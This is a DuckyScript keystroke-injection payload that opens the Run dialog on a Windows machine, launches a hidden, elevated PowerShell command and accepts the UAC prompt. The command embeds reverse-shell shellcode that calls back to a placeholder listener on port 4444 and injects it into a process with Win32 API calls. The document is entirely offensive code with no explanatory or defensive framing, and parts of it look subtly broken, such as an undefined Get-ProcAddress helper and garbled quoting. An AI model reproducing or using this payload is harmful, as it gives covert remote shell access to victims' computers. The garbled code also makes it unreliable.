
DELAY 500
GUI r
DELAY 500
STRING powershell -NoP -W Hidden -Command "Start-Process PowerShell -ArgumentList ' -NoP -W Hidden -Command {param([string]$Lhost = ''<rip>'', [int]$Lport = 4444) $shellcode = @(''`\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68$($Lhost -replace \"`.\", \"`,`\")\x68\x02\x00$([System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder($Lport))[0..1] -join \"`\")\xff\xd5\x68\x02\x00\x1f\x90\x68\x29\x80\x6b\x00\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x6a\x04\x56\x6a\x03\x56\x6a\x02\x89\xe6\x56\x50\x56\x68\x00\x01\x00\x00\x68\x29\x80\x6b\x00\xff\xd5\x85\xc0\x75\xe9\xe8\x62\x00\x00\x00\x68\x00\x01\x00\x00\x68\x29\x80\x6b\x00\xff\xd5\x89\xc6\x56\x68\x63\x6d\x64\x00\x89\xe1\x56\x51\x57\xff\xd5\x85\xc0\x75\xfe\xc3''@) $shellcodeBytes = [System.Text.Encoding]::ASCII.GetBytes($shellcode) $ProcID = $PID [System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Process') $process = [System.Diagnostics.Process]::GetProcessById($ProcID) $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll OpenProcess), [System.Runtime.InteropServices.DllImport('kernel32.dll')]).Invoke(0x1F0FFF, $false, $process.Id) if (!$hProcess) { throw 'Unable to open process handle for PID: $ProcID' } $ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAllocEx), [System.Runtime.InteropServices.DllImport('kernel32.dll')]).Invoke($hProcess, [IntPtr]::Zero, $shellcodeBytes.Length, 0x3000, 0x40) if (!$ptr) { throw 'Unable to allocate memory in PID: $ProcID' } [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll WriteProcessMemory), [System.Runtime.InteropServices.DllImport('kernel32.dll')]).Invoke($hProcess, $ptr, $shellcodeBytes, $shellcodeBytes.Length, [IntPtr]::Zero) $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll CreateRemoteThread), [System.Runtime.InteropServices.DllImport('kernel32.dll')]).Invoke($hProcess, [IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero) if (!$thread) { throw 'Unable to create remote thread in PID: $ProcID' } [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll CloseHandle), [System.Runtime.InteropServices.DllImport('kernel32.dll')]).Invoke($hProcess) Write-Host 'Shellcode injection complete!' }' -Verb RunAs"
ENTER
DELAY 500
ALT y